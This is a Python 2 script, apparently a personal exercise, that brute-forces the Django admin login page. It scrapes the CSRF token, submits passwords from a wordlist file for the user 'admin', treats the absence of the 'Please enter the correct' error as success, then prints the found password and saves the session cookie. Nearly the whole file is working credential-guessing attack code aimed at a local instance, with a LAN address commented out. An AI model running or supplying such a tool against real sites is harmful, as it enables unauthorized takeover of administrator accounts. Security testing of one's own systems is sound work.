#!/usr/bin/python
#coding=utf-8
#filename:web_auth_cookie_django.py
#only test ok at django'admin login.
""" 需要增加1：从文本文件中读取密码并记录当前读取位置，可以在用户按键后保存当前读取的位置到文件中，下一次可以判断有无记录位置的文件，按上一次保存的进度继续读取下一条密码。？？？？？？？？2014-03-04_1654
Python3 urllib 实例
http://www.itwhy.org/软件工程/python/python3-urllib-实例.html """

import urllib
import urllib2
import cookielib
import time
import sys

class AuthCookie():
    def __init__(self, user_agent, cookie_file, url):
        self.client_headers = {'User-Agent':user_agent}
        self.url = url
        self.cookiejar = cookielib.MozillaCookieJar(cookie_file)
        self.cookieproc = urllib2.HTTPCookieProcessor(self.cookiejar)
        self.opener = urllib2.build_opener(self.cookieproc)
        # self.req = urllib2.Request(self.url, self.client_headers)
        # above line is can't at here, move to crack() is right.
        
    def read_url(self):
        try:
            response = self.opener.open(self.url)
        except urllib2.HTTPError, e:
            print "at urllib2.urlopen, raise ERROR (", e, ") "
            return
        return response

    def get_cookie(self, response):
        """ get cookie from response, will find and post the csrftoken for login."""
        cookie_list = response.headers.get('Set-Cookie').split(';')
        # print cookie_list  #DEBUG
        head_cookie = {}
        for tmp in cookie_list:
            list_tmp =  str(tmp).split('=')
            head_cookie[list_tmp[0]] = list_tmp[1]
        return head_cookie

    def crack(self, username, pwd_f, csrf):
        for key1 in pwd_f:
            pwd_encode = urllib.urlencode({
                'username': username,
                'password': key1.strip(),
                'this_is_the_login_form': 1,
                'next': '/admin/',
                'csrfmiddlewaretoken': csrf,
                })
            # print pwd_encode  #DEBUG
            try:
                """ 为什么Request()是在这里，放在__init__()中会导致在最后1次opener.open()出错
                [04/Mar/2014 10:14:53] "POST /admin/ HTTP/1.1" 200 2026
                [04/Mar/2014 10:14:53] "POST /admin/ HTTP/1.1" 302 0
                [04/Mar/2014 10:14:53] "GET /admi HTTP/1.1" 404 2137 """
                self.req = urllib2.Request(self.url, self.client_headers)
                response = self.opener.open(self.req, pwd_encode)
            except urllib2.HTTPError, e:
                print "at opener.open, raise ERROR (", e, ") "
                sys.exit(-1)
            response_resu = response.getcode()
            if response_resu == 200:
                response_html = response.read()
                #怎么样判断是通过验证，标志是***用户登陆失败***
                case = response_html.find('Please enter the correct')
                if case != -1:
                    pass  # password is error
                else:
                    print time.ctime(), " Find The Key: ", key1
                    self.cookiejar.save()
                    return
    
#url_t = "http://192.168.192.214:8000/admin/"
url_t = "http://127.0.0.1:8000/admin/"
file_t = "/tmp/cookie11.txt"
agent_t = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
pwd_t = ['aaa', 'bbb', 'ksksie','ssdssw','scbh001', 'admin']

if __name__ == "__main__":
    s11 = AuthCookie(agent_t, file_t, url_t)
    response_get = s11.read_url()
    head_cookie =  s11.get_cookie(response_get)
    print head_cookie #DEBUG
    print s11.cookiejar #DEBUG
    pwd_f = open('/tmp/pwd.txt')
    s11.crack('admin', pwd_f, head_cookie['csrftoken'])
    # response_get = s11.read_url(url_t)  #DEBUG
    # print s11.cookiejar #DEBUG
